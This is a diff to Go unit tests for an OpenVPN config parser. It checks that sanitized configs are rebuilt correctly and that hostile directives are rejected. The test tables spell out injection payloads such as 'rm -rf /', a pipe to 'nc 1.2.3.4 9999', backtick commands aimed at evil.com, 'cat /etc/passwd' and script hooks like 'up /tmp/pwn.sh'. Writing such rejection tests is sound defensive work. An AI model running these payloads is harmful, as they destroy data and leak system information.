@@ -17,13 +17,25 @@ remote-cert-tls server
 `
 	b64 := base64.StdEncoding.EncodeToString([]byte(cfg))
 
-	raw, meta, err := ParseOpenVPNConfig(b64)
+	safeStr, meta, err := ParseOpenVPNConfig(b64)
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if raw != cfg {
-		t.Fatalf("raw config mismatch")
+
+	// Verify safe configuration contains canonical safe directives
+	if !strings.Contains(safeStr, "client\n") {
+		t.Errorf("expected generated safe config to contain 'client'")
 	}
+	if !strings.Contains(safeStr, "route-nopull\n") {
+		t.Errorf("expected generated safe config to contain 'route-nopull'")
+	}
+	if !strings.Contains(safeStr, "nobind\n") {
+		t.Errorf("expected generated safe config to contain 'nobind'")
+	}
+	if !strings.Contains(safeStr, "remote 198.51.100.1 1194\n") {
+		t.Errorf("expected remote in safe config: %s", safeStr)
+	}
+
 	if meta.Dev != "tun" {
 		t.Errorf("expected dev tun, got %s", meta.Dev)
 	}
@@ -101,6 +113,99 @@ verify-x509-name vpn-server name
 	}
 }
 
+func TestParseOpenVPNConfig_InlineCertificatesSafeExtraction(t *testing.T) {
+	cfg := `
+dev tun
+proto udp
+remote 198.51.100.1 1194
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIDXTCCAkWgAwIBAgIJALm7F3A5nJ0tMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
+-----END CERTIFICATE-----
+</ca>
+<cert>
+-----BEGIN CERTIFICATE-----
+MIIDRjCCAi6gAwIBAgIBAjANBgkqhkiG9w0BAQsFADBFMQswCQYDVQQGEwJKUDEO
+-----END CERTIFICATE-----
+</cert>
+<key>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0Yh0PqR3
+-----END RSA PRIVATE KEY-----
+</key>
+`
+	b64 := base64.StdEncoding.EncodeToString([]byte(cfg))
+
+	safeCfg, _, safeStr, err := ParseSafeOpenVPNConfig(b64)
+	if err != nil {
+		t.Fatalf("unexpected error parsing inline certs: %v", err)
+	}
+
+	if !strings.Contains(safeCfg.InlineCA, "MIIDXTCCAkWgAwIBAgIJALm7F3A5nJ0tMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV") {
+		t.Errorf("CA certificate extraction failed")
+	}
+	if !strings.Contains(safeCfg.InlineCert, "MIIDRjCCAi6gAwIBAgIBAjANBgkqhkiG9w0BAQsFADBFMQswCQYDVQQGEwJKUDEO") {
+		t.Errorf("Client certificate extraction failed")
+	}
+	if !strings.Contains(safeCfg.InlineKey, "MIIEowIBAAKCAQEA0Yh0PqR3") {
+		t.Errorf("Key extraction failed")
+	}
+
+	// Verify generated safe config embeds certificates properly
+	if !strings.Contains(safeStr, "<ca>\n-----BEGIN CERTIFICATE-----") {
+		t.Errorf("missing <ca> in generated config: %s", safeStr)
+	}
+}
+
+func TestParseOpenVPNConfig_MaliciousDirectivesStrictlyRejected(t *testing.T) {
+	maliciousCases := []struct {
+		name      string
+		directive string
+	}{
+		{"up script", "up /tmp/pwn.sh"},
+		{"down script", "down /tmp/pwn.sh"},
+		{"route-up script", "route-up /tmp/pwn.sh"},
+		{"route-pre-down", "route-pre-down /tmp/pwn.sh"},
+		{"plugin injection", "plugin /tmp/pwn.so"},
+		{"tls-verify script", "tls-verify /tmp/pwn.sh"},
+		{"auth-user-pass-verify", "auth-user-pass-verify /tmp/pwn.sh via-env"},
+		{"client-connect script", "client-connect /tmp/pwn.sh"},
+		{"client-disconnect script", "client-disconnect /tmp/pwn.sh"},
+		{"learn-address script", "learn-address /tmp/pwn.sh"},
+		{"management port", "management 127.0.0.1 9999"},
+		{"management-client", "management-client"},
+		{"script-security 2", "script-security 2"},
+		{"system directive", "system echo pwn"},
+		{"persist-key", "persist-key"},
+		{"persist-tun", "persist-tun"},
+		{"setenv injection", "setenv FOO bar"},
+		{"setenv-safe injection", "setenv-safe FOO bar"},
+		{"exec directive", "exec /tmp/pwn.sh"},
+		{"argument injection --", "--script-security 2"},
+		{"shell semicolon", "proto udp; rm -rf /"},
+		{"shell backtick", "dev `id`"},
+		{"shell pipe", "auth SHA256 | nc 1.2.3.4 9999"},
+		{"custom route directive", "route 10.0.0.0 255.0.0.0 1.2.3.4"},
+		{"route-ipv6 directive", "route-ipv6 2001:db8::/32"},
+		{"user change", "user nobody"},
+		{"group change", "group nogroup"},
+		{"chroot directive", "chroot /tmp"},
+		{"unauthorized tag", "<evil>\nrm -rf /\n</evil>"},
+	}
+
+	for _, tc := range maliciousCases {
+		t.Run(tc.name, func(t *testing.T) {
+			cfg := "remote 198.51.100.1 1194\n" + tc.directive + "\n"
+			b64 := base64.StdEncoding.EncodeToString([]byte(cfg))
+
+			_, _, err := ParseOpenVPNConfig(b64)
+			if err == nil {
+				t.Fatalf("SECURITY FAILURE: expected rejection for %q, but config was ACCEPTED", tc.directive)
+			}
+		})
+	}
+}
+
 func TestParseOpenVPNConfig_RejectionCases(t *testing.T) {
 	cases := []struct {
 		name   string
@@ -140,17 +245,17 @@ func TestParseOpenVPNConfig_RejectionCases(t *testing.T) {
 		{
 			name:   "malicious shell injection host",
 			input:  base64.StdEncoding.EncodeToString([]byte("remote 1.2.3.4;rm -rf / 1194\n")),
-			errMsg: "no valid remote endpoints found",
+			errMsg: "forbidden metacharacter",
 		},
 		{
 			name:   "malicious backtick host",
 			input:  base64.StdEncoding.EncodeToString([]byte("remote `whoami`.evil.com 1194\n")),
-			errMsg: "no valid remote endpoints found",
+			errMsg: "forbidden metacharacter",
 		},
 		{
 			name:   "malicious pipe host",
 			input:  base64.StdEncoding.EncodeToString([]byte("remote 1.2.3.4|cat /etc/passwd 1194\n")),
-			errMsg: "no valid remote endpoints found",
+			errMsg: "forbidden metacharacter",
 		},
 	}
 
